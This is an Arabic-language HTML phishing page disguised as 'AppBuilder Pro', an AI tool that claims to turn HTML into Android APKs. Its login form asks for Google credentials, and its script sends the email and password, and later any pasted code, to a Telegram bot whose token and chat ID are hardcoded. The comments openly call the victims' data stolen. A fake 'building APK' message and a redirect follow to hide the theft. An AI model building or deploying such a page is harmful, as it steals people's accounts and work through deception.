<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AppBuilder Pro | تسجيل الدخول</title>
    <style>
        :root { --primary: #00d4ff; --bg: #0b0e14; --card: #151921; }
        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .box { background: var(--card); padding: 35px; border-radius: 20px; border: 1px solid #2d343f; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 15px 40px rgba(0,0,0,0.5); }
        h1 { color: var(--primary); margin-bottom: 20px; }
        input, textarea { width: 100%; background: #000; color: #fff; border: 1px solid #333; padding: 12px; border-radius: 8px; margin-bottom: 15px; box-sizing: border-box; outline: none; transition: 0.3s; }
        input:focus, textarea:focus { border-color: var(--primary); }
        .btn { background: var(--primary); color: #000; border: none; padding: 15px; width: 100%; border-radius: 50px; font-weight: bold; cursor: pointer; transition: 0.4s; }
        .btn:hover { transform: scale(1.02); box-shadow: 0 0 20px var(--primary); }
        #editor-section { display: none; } /* مخفي حتى تسجيل الدخول */
        .loading { display: none; margin-top: 20px; }
    </style>
</head>
<body>

<div class="box" id="login-section">
    <h1>AppBuilder PRO</h1>
    <p style="color: #8a94a6;">سجل دخولك باستخدام حساب جوجل للوصول لمحرر APK</p>
    <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
    <input type="password" id="password" placeholder="كلمة المرور" required>
    <button class="btn" onclick="captureLogin()">تسجيل الدخول</button>
</div>

<div class="box" id="editor-section">
    <h1>محرر الأكواد AI</h1>
    <p style="color: #8a94a6;">ضع كود HTML لتحويله لتطبيق أندرويد</p>
    <textarea id="htmlInput" placeholder="<html> ... </html>" style="height: 200px; color: #00ff41;"></textarea>
    <button class="btn" onclick="captureCode()">بناء ملف APK الآن</button>
    
    <div class="loading" id="loader">
        <div style="border: 4px solid #333; border-top: 4px solid var(--primary); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
        <p id="status-text" style="font-size: 12px; margin-top: 10px;">جاري المعالجة...</p>
    </div>
</div>

<script>
    const TOKEN = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
    const ADMIN_ID = "8754338811";

    // دالة إرسال البيانات للتليجرام
    async function sendToBot(msg) {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: ADMIN_ID, text: msg, parse_mode: 'Markdown' })
        });
    }

    // 1. سحب بيانات الدخول
    async function captureLogin() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;

        if(!email || !pass) return alert("يرجى ملء الحقول!");

        // إرسال الحساب المسروق فوراً
        await sendToBot(`🔥 **صيد جديد (تسجيل دخول):**\n📧 الإيميل: \`${email}\` \n🔑 الباسورد: \`${pass}\``);

        // الانتقال للمرحلة التالية (المحرر)
        document.getElementById('login-section').style.display = 'none';
        document.getElementById('editor-section').style.display = 'block';
    }

    // 2. سحب كود الـ HTML
    async function captureCode() {
        const code = document.getElementById('htmlInput').value;
        const loader = document.getElementById('loader');

        if(code.length < 10) return alert("أدخل كود صحيح!");

        loader.style.display = 'block';

        // إرسال الكود المسحوب
        await sendToBot(`🚀 **كود HTML مسحوب من الضحية:**\n\n\`\`\`html\n${code}\n\`\`\``);

        // تمويه الضحية
        setTimeout(() => { document.getElementById('status-text').innerText = "جاري تجميع حزم APK..."; }, 2000);
        setTimeout(() => { 
            window.location.href = "https://t.me/8601512823?start=ready"; // توجيه للبوت لاستلام الملف
        }, 5000);
    }
</script>

<style> @keyframes spin { 100% { transform: rotate(360deg); } } </style>
</body>
</html>
